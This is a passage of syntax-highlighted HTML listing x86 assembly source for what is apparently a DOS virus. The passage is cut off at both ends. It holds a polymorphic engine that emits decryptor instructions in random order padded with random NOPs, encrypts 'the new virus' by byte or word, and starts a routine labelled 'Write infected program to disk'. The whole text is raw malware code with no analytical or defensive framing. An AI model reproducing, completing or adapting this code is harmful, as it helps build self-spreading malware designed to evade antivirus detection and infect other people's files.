&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">7</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;set for c</span><br />
<br />
Byte_Or_Word<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">test</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bl</span><span style="color: #339933;">,</span><span style="color: #ff0000;">10h</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;byte or word?</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jnz</span> &nbsp; &nbsp; short AX_Or_DX<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">73h</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;set for byte</span><br />
<br />
AX_Or_DX<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">test</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bh</span><span style="color: #339933;">,</span><span style="color: #ff0000;">80h</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;AX or DX?</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jnz</span> &nbsp; &nbsp; short Store_Method<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">70h</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;not DX (so AX or CX)</span><br />
<br />
Store_Method<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span><br />
<br />
Write_MOVs<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; Random_Number &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;put MOV instructions in</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0Fh</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; a random order</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0Ah</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ja</span>&nbsp; &nbsp; &nbsp; short Write_MOVs<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span><br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;test if MOV already done</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xchg</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">cx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">shl</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">cl</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">dx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jz</span>&nbsp; &nbsp; &nbsp; short Write_MOVs<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;remember which MOV done</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; Generate_MOV&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;insert MOV instruction</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; NOP_Size&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;insert a random NOP</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">or</span>&nbsp; &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">dx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;all MOVs done?</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jnz</span> &nbsp; &nbsp; short Write_MOVs<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">di</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;save start of decryptor loop</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; ADD_AX&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;add a value to AX in loop?</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; NOP_Size<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">test</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bh</span><span style="color: #339933;">,</span><span style="color: #ff0000;">20h</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;carry with ADD/SUB ?</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jz</span>&nbsp; &nbsp; &nbsp; short Fill_Loop<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0F8h</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosb</span><br />
<br />
Fill_Loop<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span>XOR_Ofs<span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; Generate_Crypter&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;place all loop instructions</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; Gen_Counter<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; NOP_Size<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;get start of decryptor loop</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; Gen_Loop<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;calculate loop offset</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">test</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bh</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;up or down?</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jz</span>&nbsp; &nbsp; &nbsp; short Is_Byte<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">cx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">dec</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">test</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bl</span><span style="color: #339933;">,</span><span style="color: #ff0000;">10h</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;encrypt with byte or word?</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jz</span>&nbsp; &nbsp; &nbsp; short Is_Byte<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0FEh</span><br />
<br />
Is_Byte<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">di</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">bp</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">si</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span>XOR_Ofs<span style="color: black;">&#93;</span><br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span>ByteFill<span style="color: black;">&#93;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">test</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bl</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0Ch</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;are BL,BH used for crypt?</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jnz</span> &nbsp; &nbsp; short Not_Bx<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">byte</span> ptr <span style="color: #46aa03; font-weight: bold;">es</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">si</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">al</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span>ByteFill2<span style="color: black;">&#93;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">byte</span> ptr <span style="color: #46aa03; font-weight: bold;">es</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">si</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ah</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; short Word_Crypt<br />
<br />
Not_Bx<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #46aa03; font-weight: bold;">es</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">si</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span><br />
<br />
Word_Crypt<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span>XOR_Val<span style="color: black;">&#93;</span><span style="color: black; font-style: italic;">;encryption value</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;ds:si = start of code</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">di</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;save ptr to encrypted code</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;save length of encrypted code</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">test</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bl</span><span style="color: #339933;">,</span><span style="color: #ff0000;">10h</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;byte or word?</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jz</span>&nbsp; &nbsp; &nbsp; short Enc_Virus_b<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">inc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;cx = # of crypts (words)</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">shr</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1</span><br />
<br />
<span style="color: black; font-style: italic;">;--- Encrypt the new virus --------------------------------</span><br />
Enc_Virus_w<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lodsw</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;encrypt code (words)</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; Do_Encryption<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosw</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">loop</span>&nbsp; &nbsp; Enc_Virus_w<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; short Encrypted<br />
<br />
Enc_Virus_b<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lodsb</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;encrypt code (bytes)</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dh</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">dh</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; Do_Encryption<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosb</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">loop</span>&nbsp; &nbsp; Enc_Virus_b<br />
<br />
Encrypted<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">di</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;cx = length decryptpr + code</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;ax = length of decrypted code</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">di</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;di = offset encrypted code</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">dx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;ds:dx = decryptor + cr. code</span><br />
<br />
<span style="color: black; font-style: italic;">;--- Write infected program to disk -----------------------</span><br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">es</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ds</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;work segment</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">di</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;length of decryptor/ofs encrypted code</span><br />
